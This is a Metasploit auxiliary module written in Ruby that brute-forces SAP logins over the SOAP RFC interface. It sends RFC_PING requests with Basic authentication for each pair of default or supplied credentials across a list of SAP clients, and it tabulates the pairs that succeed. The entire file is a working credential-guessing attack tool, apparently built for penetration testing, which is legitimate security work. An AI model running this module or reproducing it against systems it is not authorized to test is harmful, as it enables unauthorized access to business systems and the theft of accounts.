##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

##
# This module is based on, inspired by, or is a port of a plugin available in 
# the Onapsis Bizploit Opensource ERP Penetration Testing framework - 
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley, 
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and 
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name' => 'SAP SOAP RFC Brute Forcer (via RFC_PING)',
			'Version' => '$Revision$',
			'Description' => %q{
				This module attempts to brute force the username | password via an RFC interface (over SOAP).
				Default clients can be tested without needing to set a CLIENT.
				Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE.
				The default usernames and password combinations are stored in ./data/wordlists/sap_default.txt.
				},
			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
			'Author' => [ 'Agnivesh Sathasivam','nmonkee' ],
			'License' => BSD_LICENSE
			)
		register_options([
			OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
			OptBool.new('DEFAULT_CRED',[false, 'Check using the defult password and username',true]),
			], self.class)
		register_autofilter_ports([ 8000 ])
	end

	def run_host(ip)
		if datastore['CLIENT'].nil?
			print_status("Using default SAP client list")
			client = ['000', '001', '066']
		else
			client = []
			if datastore['CLIENT'] =~ /^\d{3},/
				client = datastore['CLIENT'].split(/,/)
				print_status("Brute forcing clients #{datastore['CLIENT']}")
			elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
				array = datastore['CLIENT'].split(/-/)
				client = (array.at(0)..array.at(1)).to_a
				print_status("Brute forcing clients #{datastore['CLIENT']}")
			elsif datastore['CLIENT'] =~ /^\d{3}\z/
				client.push(datastore['CLIENT'])
				print_status("Brute forcing client #{datastore['CLIENT']}")
			else
				print_status("Invalid CLIENT - using default SAP client list instead")
				client = ['000', '001', '066']
			end
		end
		saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
			'Header' => "[SAP] Credentials",
			'Prefix' => "\n",
			'Postfix' => "\n",
			'Indent'  => 1,
			'Columns' =>
				[
					"host",
					"port",
					"client",
					"user",
					"pass"
				])
		if datastore['DEFAULT_CRED']
			datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
			credentials = extract_word_pair(datastore['USERPASS_FILE'])
			credentials.each do |u, p|
				client.each do |cli|
					success = bruteforce(u, p, cli)
					if success == true
						saptbl << [ datastore['RHOST'], datastore['RPORT'], cli, u, p]
					end
				end
			end
		else
			each_user_pass do |u, p|
				client.each do |cli|
					success = bruteforce(u, p, cli)
					if success == true
						saptbl << [ datastore['RHOST'], datastore['RPORT'], cli, u, p]
					end
				end
			end
		end
		print(saptbl.to_s)
	end

	def bruteforce(username,password,client)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
		data << '<env:Body>'
		data << '<n1:RFC_PING xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '</n1:RFC_PING>'
		data << '</env:Body>'
		data << '</env:Envelope>'
		user_pass = Rex::Text.encode_base64(username+ ":" + password)
		begin
			success = false
			error = []
			error_msg = []
			res = send_request_raw({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + client + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'headers' =>{
					'Content-Length' => data.size.to_s,
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + client,
					'Authorization' => 'Basic ' + user_pass,
					'Content-Type' => 'text/xml; charset=UTF-8'}
					}, 45)
			if res.code == 401
				success = false
				return success
			elsif res.code == 500
				response = res.body
				error.push(response.scan(%r{<faultstring>(.*?)</faultstring>}))
				error.push(response.scan(%r{<message>(.*?)</message>}))
				success = false
			elsif res.code == 200
				success = true
				return success
			elsif res.body =~ /Response/
				#puts res
			end
			if success == false
				err = error.join().chomp
				print_error("#{datastore['RHOSTS']}:#{datastore['RPORT']} -#{err} - #{client}:#{username}:#{password}")
			end
			rescue ::Rex::ConnectionError
				print_error("#{datastore['RHOST']}:#{datastore['RPORT']} - Unable to connect")
				return
			end
		end
	end
